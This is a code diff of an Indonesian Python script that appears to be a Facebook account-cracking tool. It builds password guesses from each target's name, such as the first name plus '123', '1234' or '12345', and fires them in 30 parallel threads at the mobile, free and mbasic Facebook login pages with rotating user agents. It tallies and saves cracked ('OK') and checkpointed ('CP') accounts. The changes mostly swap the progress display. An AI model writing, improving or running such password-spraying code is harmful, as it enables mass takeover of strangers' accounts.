@@ -481,31 +481,32 @@ def setting():
 	
 ###----------[ PROSES CRACK ]---------- ###
 def passwrd():
-	global prog,des
 	print(f'{P}[•]{x} Hasil {H}OK{x} Tersimpan Di{x} {P}:{x} {h}%s {x}'%(okc))
 	print(f'{P}[•]{x} Hasil {K}CP{x} Tersimpan Di{x} {P}:{x} {k}%s {x}'%(cpc))
-	basari_tamvan('=' * 40);prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
-	with prog:
-		with tred(max_workers=30) as pool:
-			for yuzong in id2:
-				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-				frs = nmf.split(' ')[0]
-				pwv = []
-				if len(nmf)<6:
-					if len(frs)<3:
-						pass
-						
+	print(f'{b}========================================{x}')
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
 				else:
-					if len(frs)<3:
-						pwv.append(nmf)
-					else:
-						pwv.append(nmf)
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
-						pwv.append(frs+'12345')
-				if 'ya' in pwpluss:
-					for xpwd in pwnya:
-						pwv.append(xpwd)
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'12345')
+			if 'ya' in pwpluss:
+				for xpwd in pwnya:
+					pwv.append(xpwd)
 			else:pass
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
@@ -524,11 +525,9 @@ def passwrd():
 ###----------[ METODE CRACK M ]---------- ###
 def crack(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice(['\33[m'])
-	pers = loop*100/len(id2)
-	fff = '%'
-	prog.update(des,description=f'mobile.facebook[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
-	prog.advance(des)
+	bo = random.choice([m,k,h,b,u,x])
+	sys.stdout.write(f"\r[>] MOBILE {P}{loop}{P}/{P}{len(id)}{P} OK : {H}{ok}{P} CP : {k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
@@ -563,11 +562,9 @@ def crack(idf,pwv):
 ###----------[ METODE CRACK F ]---------- ###
 def crackfree(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice(['\33[m'])
-	pers = loop*100/len(id2)
-	fff = '%'
-	prog.update(des,description=f'free.facebook[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
-	prog.advance(des)
+	bo = random.choice([m,k,h,b,u,x])
+	sys.stdout.write(f"\r[>] FREE {P}{loop}{P}/{P}{len(id)}{P} OK : {H}{ok}{P} CP : {k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
@@ -602,11 +599,9 @@ def crackfree(idf,pwv):
 ###----------[ METODE CRACK B ]---------- ###
 def crackmbasic(idf,pwv):
 	global loop,ok,cp
-	bi = random.choice(['\33[m'])
-	pers = loop*100/len(id2)
-	fff = '%'
-	prog.update(des,description=f'mbasic.facebook[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
-	prog.advance(des)
+	bo = random.choice([m,k,h,b,u,x])
+	sys.stdout.write(f"\r[>] MBASIC {P}{loop}{P}/{P}{len(id)}{P} OK : {H}{ok}{P} CP : {k}{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
